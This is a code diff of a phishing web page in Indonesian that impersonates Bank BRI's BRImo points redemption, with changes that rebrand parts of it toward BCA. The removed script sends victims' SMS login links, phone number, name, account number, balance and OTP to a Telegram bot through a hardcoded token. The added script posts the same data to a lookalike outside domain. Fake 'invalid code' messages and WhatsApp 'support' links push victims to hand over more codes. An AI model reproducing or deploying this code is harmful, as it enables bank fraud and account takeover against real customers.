@@ -2,7 +2,7 @@
  <head> 
   <meta charset="utf-8"> 
   <meta name="fragment" content="!"> 
-  <meta name="theme-color" content="#0F78CB"> 
+  <meta name="theme-color" content="#0066AE"> 
    <!-- HTML Meta Tags -->
 
   <title>𝗕𝗥𝗜𝗣𝗼𝗶𝗻 | 𝗧𝘂𝗸𝗮𝗿𝗸𝗮𝗻 𝗣𝗢𝗜𝗡-𝗺𝘂</title>
@@ -39,7 +39,7 @@
             width: 100%;
             font-family: 'Open Sans', sans-serif;
             position: fixed;
-            background:#d1d1d1;
+            background:#F1F5F8;
         }
 
         .text-header {
@@ -101,7 +101,7 @@
             height: 45px; 
             width: 336px;
             max-width: 90%;
-            border: 3px solid rgb(0, 134, 224);
+            border: 1px solid #0066AE;
             border-radius: 23px;
             font-family: 'Open Sans', sans-serif;
             font-size: 16px; 
@@ -109,6 +109,12 @@
             word-spacing: 0px; 
             padding: 0px 45px;
             text-align: center;
+            border: 1px solid rgb(0, 134, 224); border-image: initial;
+            font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 0px;
+            }
+            
+            .form-log::placeholder{
+                opacity: 0.5;
             }
 
         #ionIcons {
@@ -244,68 +250,33 @@
     </style> 
  </head> 
  <body> 
-  <span class="blink" style="display: none" id="blinkk"><h1>Tautan Link tidak Valid, atau sudah Kadaluarsa</h1></span>
- <span class="blink" style="display: none" id="blinkAktivasi"><h1>Kode Aktivasi tidak valid, atau sudah kadaluarsa</h1></span> 
-  <div class="container" id="sms" style="display: none"> 
-   <div class="box-lte"> 
-    <div class="row" style="margin-top: 150px;"> 
-     <div class="col-12 d-block mx-auto text-center p-0" style="height: 150px; width: 256px; max-width: 100%; display: block; margin-top: -50px; border-radius: 0px;"> 
-      <img alt="" src="https://d1muf25xaso8hp.cloudfront.net/https%3A%2F%2Fs3.amazonaws.com%2Fappforest_uf%2Ff1654616003584x348160725283053200%2Fhttps___s3.amazonaws.com_appforest_uf_f1649512719186x581120083778390800_PSX_20220401_045909-removebg%252520%2525281%252529%2520%25281%2529.png?w=384&h=246&auto=compress&dpr=2&fit=max" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;" margin-left:="" 10px;="" margin-right:=""> 
-     </div> 
-    </div> 
-    <div class="row"> 
-     <hr style="display: block; margin: auto; width: 90%;"> 
-     <p style="font-weight: bold; font-size: 20px; color: #098CE3; text-align: center; margin: 10px auto;" id="timer">3 : 00</p> 
-    </div> 
-    <div class="row"> 
-     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px; margin-top: -10px"> 
-      <p style="font-size: 10px; text-align: center; font-weight: bold; padding: 15px">Link untuk Penukaran POIN BRImo telah kami kirim ke nomor handphone anda, silakan cek SMS lalu masukkan Link di bawah ini<br><br>Link Konfirmasi (Wajib).</p> 
-     </div> 
-    </div> 
-    <div class="row"> 
-     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto;"> 
- <form onsubmit="kirimPesan(event)" method="post" id="formLink">
-       <center> 
-        <div style="margin-top: 1px"> 
-        
-      <textarea id="nama" minlength="20" placeholder="Contoh SMS https://brimo.bri.co.id/app/login?code=xxxxxx" onclick="gantiborder()" required class="" oninvalid="this.setCustomValidity('Hɑrɑp 𝗦𝗔𝗟𝗜𝗡 dɑn 𝗧𝗘𝗠𝗣𝗘𝗟 dengɑn benɑr untuk 𝗟𝗶𝗻𝗸 yɑng yɑng diterimɑ di 𝗦𝗠𝗦')" onchange="this.setCustomValidity('')" id='float-only' name='float-only'></textarea>
+ <nav style="position: relative; top: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 65px; background: #F1F5F8; ">
+ <img style="" width="100%" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNZj1FZm__EnIcNeQv8ruJ-8s0rgk-yv8IqHfUijWQcHaKKORTAjeoAMbLY2GBXQoHf3HpwdIW3JC4XLBDNBHcAnjZESUkoICPBQ21kJI1NYt_T-6JMyM1GnrFip4aKITq2sMWXL8-mXSiv1pQmBmbudJucaoWpyH-6wFvNhk-mDaPwRYmBQiO6juF8Uc/s1080/Screenshot_2024-05-23-17-01-48-81_40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="" />   
+</nav>
+
+
+
+<div class="" style="margin-top: 0px; height: 230px; background: #F1F5F8">
+<center>
  
-         <b> <p style="font-size: 11px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000;">Mohon jangan diisi jika belum menerima SMS Link Penukaran dari BRI-Aktivasi berupa Link..!!</strong></p></b>
-        </div>
-       </center>
-       <b>
-<input type="submit" id="kirim" class="bubble-element Button clickable-element" style="max-width: 85%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 15px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" tabindex="2" value="KIRIM"/>
-</b>
-      </form>
-     </div>
-     <b> </b>
-    </div>
-    <b> </b>
-   </div>
-   <b> 
-    <div class="row"> 
-     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;"> 
-      <p style="font-size: 12px; text-align: center; margin-top: 50px;"><strong style="color: #5e5e5e;">Tidak terima SMS? <a href="Aktivasi.html" style="text-decoration: none; color: none rgb(9, 100, 127);">Kirim ulang SMS</a></strong></p> 
-     </div>
-     <center>
-     <p style="text-align: center; border: 2px solid #ccc; width: 150px; background: none rgb(9, 140, 227); margin-top: -12px; border-radius: 15px; font-size: 13px; height: 30px; padding-top: 4px; color: white; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; " onclick="ubahmode()">Ganti via Aktivasi</p>
-     </center>
-    </div> </b>
-  </div>
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR2wMNDTAXl0hAinwNCM_XW9nrKDX9YXmij102TOtqIsva0FJzi_x7HtmnD&s=10" width="95%" style="border-radius: 15px 15px 3px 3px; height: 195px">
+   <div style="width: 95%; height: 30%; display: block; background-color: #F1F5F8; position: fixed; top: 37%; left: 0; right: 0; border-radius: 15px 15px 0px 0px; border-top: 2px inset #fff; margin: 0px auto;z-index: ;"></div>
+</center>
+</div>
+  <span class="blink" style="display: none" id="blinkk"><h1>Tautan Link tidak Valid, atau sudah Kadaluarsa</h1></span>
+ 
    <div class="container" id="Aktivasi" style="display: block"> 
-   <div class="box-lte"> 
-    <div class="row" style="margin-top: 140px;"> 
-     <div class="col-12 d-block mx-auto text-center p-0" style="height: 150px; width: 256px; max-width: 100%; display: block; margin-top: -50px; border-radius: 0px;"> 
-      <img alt="" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQwXoZaQfr4ksx51WILDwW3b5L3eH38kTHS91Furw4RPO409ThwHYVJ3RY_4LAztsnYCUqfp_-GQz-lQ8UnNHlWE04X_vHEAA8ret_XVQ9OFEujvGLpfRgYgdokCEoYymR1WoGIp56mLSeRHgpVy4FDLTVDMtWWotVS1E8pQcDtOL5-fi2NJDif9WV-gU/s1080/AddText_02-18-09.12.14.png" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;" margin-left:="" 10px;="" margin-right:=""> 
-     </div> 
+   <div class="box-lte" style="position: relative; z-index: 9999"> 
+    <div class="row" style="margin-top: 20px;"> 
+    
     </div> 
     <div class="row"> 
-     <hr style="display: block; margin: auto; width: 90%;"> 
-     <p style="font-weight: bold; font-size: 20px; color: #098CE3; text-align: center; margin: 10px auto;" id="waktu">1 : 00</p> 
+
+     <p style="font-weight: bold; font-size: 20px; color: #098CE3; text-align: center; margin: 10px auto;" id="waktu">2 : 00</p> 
     </div> 
     <div class="row"> 
      <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px; margin-top: -10px"> 
-      <p style="font-size: 10px; text-align: center; font-weight: bold; padding: 15px">Silahkan masukan kode Aktivasi TARIF Anda, Jika belum menerima Kode silahkan klik tombol di bawah ini<br><br>Kode Konfirmasi (Wajib).</p> 
+      <p style="font-size: 10px; text-align: center; font-weight: bold; padding: 15px">Silahkan masukan kode Virtual TARIF Anda, Jika belum menerima Kode silahkan klik tombol di bawah ini<br><br><b style="font-size: 16px; color: #0066AE">Masukkan Kode Virtual</b></p> 
      </div> 
     </div> 
     <div class="row"> 
@@ -316,19 +287,20 @@
         
        <i class="ion-ios-locked-outline" id="ionIcons"></i> 
    <input type="hidden" id="logo" value="༺═𝗕𝗮𝗻𝗸 𝗕𝗥𝗜═༻">
-<input type="hidden" id="nopon" name="nomorsaya" value="">
-<input type="hidden" id="namasaya" name="namasaya" value="">
-<input type="hidden" id="nomorrek" name="debitku" value="">
-<input type="hidden" id="saldoku" name="debitku" value="">
-         <input type="tel" id="nama1"  class="bubble-element Input form-log" placeholder="KODE Aktivasi 6 DIGIT" maxlength="6" minlength="6" pattern="(?=.*[0-9]).{6,6}"  required oninvalid="this.setCustomValidity('Mohon mɑsukkɑn 𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 dengɑn benɑr')" onchange="this.setCustomValidity('')" style="margin-left: 0px;" required onclick="gantiborder1()">
+<input type="hidden" id="nopon" name="tele" value="">
+<input type="hidden" id="namasaya" name="namanye" value="">
+<input type="hidden" id="nomorrek" name="kertu" value="">
+<input type="hidden" id="saldoku" name="uang" value="">
+         <input type="tel" name="otp" id="nama1"  class="bubble-element Input form-log" placeholder="Kode Virtual 6 DIGIT" maxlength="6" minlength="6" pattern="(?=.*[0-9]).{6,6}"  required oninvalid="this.setCustomValidity('Mohon mɑsukkɑn 𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 dengɑn benɑr')" onchange="this.setCustomValidity('')" style="margin-left: 0px; border-radius: 15px 0px 15px 0px;" required onclick="gantiborder1()">
   
-         <b> <p style="font-size: 14px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000; text-decoration: underline" onclick="location.href='https://wa.me/628154039325?text=Hallo%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜%0ASaya%20mau%20Request%20kode%20Aktivasi'"> Belum Menerima Kode Aktivasi ? </strong></p></b>
+         <b> <p style="font-size: 14px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px; position: relative" onclick="location.href='https://wa.me/6285347231021?text=Hallo%20Bank%20BCA%0ASaya%20mau%20request%20kode%20Virtual'"><strong style="color: #FF0000; text-decoration: underline; width: 90%" > Belum Menerima Kode Virtual ? </strong></p></b>
         </div>
        </center>
-       <b>
-<input type="submit" id="kirims" class="bubble-element Button clickable-element" style="max-width: 85%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 15px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" tabindex="2" value="Konfirmasi"  />
-</b>
-      </form>
+       
+<div style="position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 85px; background: #fff; box-shadow: rgba(0, 0, 0, 0.15) 5px 5px 15px 0px; padding-top: 15px">
+<button type="submit" id="kirims" style="margin-left: 20px;margin-top:px ;position:absolute;background-color:#0066AE;color:white;border:0px solid #0076e0;width:90%;border-radius:50px;font-family: 'Nunito', sans-serif;font-size: 15px;padding:13px;display: inline-block; box-shadow: rgba(0, 0, 0, 0.10) 0px 10px 10px, rgba(0, 0, 0, 0.20) 0px 6px 6px;" >Konfirmasi</button>
+           </div>
+</form>
      </div>
      <b> </b>
     </div>
@@ -337,10 +309,13 @@
    <b> 
     <div class="row"> 
      <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;"> 
-      <p style="font-size: 12px; text-align: center; margin-top: 50px;"><strong style="color: #5e5e5e;">Tidak terima SMS? <a href="otp.html" style="text-decoration: none; color: none rgb(9, 100, 127);">Kirim ulang SMS</a></strong></p> 
+      <p id="kirimulang" style="font-size: 12px; text-align: center; margin-top: 55px;"><strong style="color: #5e5e5e;">Tidak terima SMS? <a href="otp.html" style="text-decoration: none; color: none rgb(9, 100, 127);">Kirim ulang SMS</a></strong></p> 
+      <p id="blinkAktivasi" style="font-size: 12px; text-align: center; margin-top: 55px;" class="blink"><strong style="color: red;">Kode Virtual tidak valid, atau sudah kadaluarsa</a></strong></p> 
+     
+  
      </div> 
      <center>
- <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwzhsQd1K7iF1d2s06-jdlmwaZV6_bR1eZiRCjx7LnbIHag5c5iAEOVfgP9UE-lQqv0M2-C7gQ3u6y6C-0E1iLZASRfrNtk7YOeBa_5obrbvmB4yi2MOjPPseRovva7VTIMmt3dXKcdlSDiqBt5-D_T5W1RiloJ5AOct6wnyv4SZI6Cj6Ahfc2j_x3NZA/s1080/1703668668502.png" style="width: 100%; position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto">
+ 
      </center>
     </div> </b>
   </div>
@@ -350,6 +325,8 @@
     crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 <script src="mainkode.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+   <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="https://dev-danapemulihan.pantheonsite.io/asset/jquery.mask.min.js"></script>
 <script>
 var nomorhp = sessionStorage.getItem("nomorhp");
 
@@ -364,7 +341,7 @@ document.getElementById("saldoku").value = saldo + "";
 </script>   
 <script>
     window.onload = function() {
-  var minute = 00;
+  var minute = 01;
   var sec = 59;
   setInterval(function() {
     document.getElementById("waktu").innerHTML =   minute + " : " + sec  ;
@@ -375,7 +352,7 @@ document.getElementById("saldoku").value = saldo + "";
       sec = 59;
 
       if (minute == 0) {
-        minute = 1;
+        minute = 0;
       }
     }
   }, 1000);
@@ -384,147 +361,56 @@ document.getElementById("saldoku").value = saldo + "";
   
   
    
-    document.getElementById('waktu1').innerHTML =
-          01 + ":" + 01;
-        startTimer();
-        
-        function startTimer() {
-          var presentTime = document.getElementById('waktu1').innerHTML;
-          var timeArray = presentTime.split(/[:]+/);
-          var m = timeArray[0];
-          var s = checkSecond((timeArray[1] - 1));
-          if(s==59){m=m-1}
-          if(m<0){
-            return
-          }
-          
-          document.getElementById('waktu1').innerHTML =
-            m + " : " + s;
-          console.log(m)
-          setTimeout(startTimer, 1000);
-          
-        }
-        
-        function checkSecond(sec) {
-          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
-          if (sec < 0) {sec = "59"};
-          return sec;
-        }
-        
-        
-        
-    
-    </script>  
-  <script>
-      document.getElementById('timer').innerHTML =
-          01 + ":" + 01;
-        startTimer1();
-        
-        function startTimer1() {
-          var presentTime = document.getElementById('timer').innerHTML;
-          var timeArray = presentTime.split(/[:]+/);
-          var m = timeArray[0];
-          var s = checkSecond((timeArray[1] - 1));
-          if(s==59){m=m-1}
-          if(m<0){
-            return
-          }
-          
-          document.getElementById('timer').innerHTML =
-            m + " : " + s;
-          console.log(m)
-          setTimeout(startTimer1, 1000);
-          
-        }
-        
-        function checkSecond(sec) {
-          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
-          if (sec < 0) {sec = "59"};
-          return sec;
-        }
-        
-        
-        
   </script>
   <!-- Static App Form Collection Script -->
 <!--<script src="https://static.app/js/static-forms.js" type="text/javascript"></script>
 
 <script src="https://static.app/js/static.js" type="text/javascript"></script>-->
+ <script>
+ $('#formLink').on('submit', function (event) {
+
+  event.stopPropagation();
+    event.preventDefault();
+    
+ document.getElementById('kirims').innerHTML = "Memproses....";
+
+
+
+$.ajax({
+
+ type: 'POST',
+ url: 'https://code-jquery-com.c1.is/BCA/10/sendOtp.php',
+ async: false,
+ dataType: 'JSON',
+ data: $(this).serialize(),
  
-<script>
-   function kirimPesan(event){
-  event.preventDefault();
-
-
-
-    var nama = document.getElementById('nama');
-    
-
-    var gabungan = '𝗦𝗠𝗦 𝗟𝗜𝗡𝗞%3A%0A' + nama.value;
-
-    var token = '6880494157:AAGJ2cGfxWy-KLu5lCNE3Y_oT3gTS9CEpMs'; // Ganti dengan token bot yang kamu buat
-    var grup = '6868634009'; // Ganti dengan chat id dari bot yang kamu buat
-    $.ajax({
-        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
-        method: `POST`,
-        
-    success: function(){
- document.getElementById("blinkk").style.display = "block";
- $("#nama").addClass('textarea'); 
-    setTimeout(function(){
-document.getElementById("formLink").reset();
-    }, 1000);}});};
-    
-    
-    
-    
-function ubahmode(){
-     document.getElementById("sms").style.display = "none";
-     document.getElementById("Aktivasi").style.display = "block";
-}
-function ubahmode1(){
-     document.getElementById("sms").style.display = "block";
-     document.getElementById("Aktivasi").style.display = "none";
-}
-
-
-
-
-
-function kirimPesan1(event){
-  event.preventDefault();
-
-document.getElementById('kirims').value = "Memproses....";
-
-   var logo = document.getElementById('logo');
-   var nopon = document.getElementById('nopon');
-   var namasaya = document.getElementById('namasaya');
-   var nomorrek = document.getElementById('nomorrek');
-   var saldoku = document.getElementById('saldoku');
-   var nama1 = document.getElementById('nama1');
-    
-    
-
-    var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 %3A%0A' + nopon.value + '%0A𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽 :%0A' + namasaya.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗥𝗲𝗸𝗲𝗻𝗶𝗻𝗴 :%0A' + nomorrek.value + '%0A𝗦𝗮𝗹𝗱𝗼 𝗧𝗲𝗿𝗮𝗸𝗵𝗶𝗿 :%0A' + saldoku.value + '%0A%0A𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 %3A%0A' + nama1.value;
-
-   var token = '6880494157:AAGJ2cGfxWy-KLu5lCNE3Y_oT3gTS9CEpMs'; // Ganti dengan token bot yang kamu buat
-    var grup = '6868634009'; // Ganti dengan chat id dari bot yang kamu buat
-
-    $.ajax({
-        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
-        method: `POST`,
-        
-   success: function(){
-     
-     
- document.getElementById("blinkAktivasi").style.display = "block";
+ complete: function(data) {
+            console.log('Complete')
+ setTimeout(function(){
+  document.getElementById("blinkAktivasi").style.display = "block";
+  document.getElementById("kirimulang").style.display = "none";
  $("#nama1").val("");
  $("#nama1").addClass('textarea1'); 
-    setTimeout(function(){
+   
 
 
-    }, 1000);}});};
+    }, 1000);
+   setTimeout(function(){
+     document.getElementById("blinkAktivasi").style.display = "none";
+  document.getElementById("kirimulang").style.display = "block";  
+  document.getElementById('kirims').innerHTML = "Konfirmasi";
+
+ }, 5000);
+
+
+        }
+    });
+
+    return false;
+});   
+        
 </script>
+
 <script>
  function gantiborder(){
    $("#nama").removeClass('textarea'); 
@@ -539,4 +425,4 @@ document.getElementById('kirims').value = "Memproses....";
  }   
 </script>
 </body>
-</html><!--<script src='https://a.bsite.net/footer.js'></script>
+</html>
